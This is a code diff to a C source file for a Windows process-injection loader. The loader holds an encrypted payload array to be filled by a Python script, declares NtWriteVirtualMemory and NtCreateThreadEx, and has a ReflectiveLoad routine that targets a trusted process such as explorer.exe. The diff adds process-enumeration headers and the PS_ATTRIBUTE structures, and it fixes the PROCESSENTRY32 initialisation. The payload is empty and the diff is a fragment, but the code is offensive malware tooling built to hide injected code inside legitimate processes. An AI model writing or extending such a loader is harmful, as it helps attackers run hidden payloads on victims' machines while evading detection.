@@ -1,6 +1,8 @@
 #include <windows.h>
 #include <stdio.h>
 #include <winternl.h>
+#include <tlhelp32.h>  // Added for process snapshot functions
+#include <psapi.h>     // Added for process enumeration
 
 // These will be replaced by the Python script
 unsigned char encrypted_payload[] = {};
@@ -22,6 +24,21 @@ typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
     ULONG NumberOfBytesToWrite,
     PULONG NumberOfBytesWritten
 );
+
+typedef struct _PS_ATTRIBUTE {
+    ULONG_PTR Attribute;
+    SIZE_T Size;
+    union {
+        ULONG_PTR Value;
+        PVOID ValuePtr;
+    };
+    PSIZE_T ReturnLength;
+} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
+
+typedef struct _PS_ATTRIBUTE_LIST {
+    SIZE_T TotalLength;
+    PS_ATTRIBUTE Attributes[1];
+} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
 
 typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
     PHANDLE ThreadHandle,
@@ -55,7 +72,8 @@ void ReflectiveLoad() {
     // Target a trusted process (like explorer.exe)
     DWORD pid = 0;
     HANDLE hProcess = NULL;
-    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
     
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (Process32First(hSnapshot, &pe32)) {
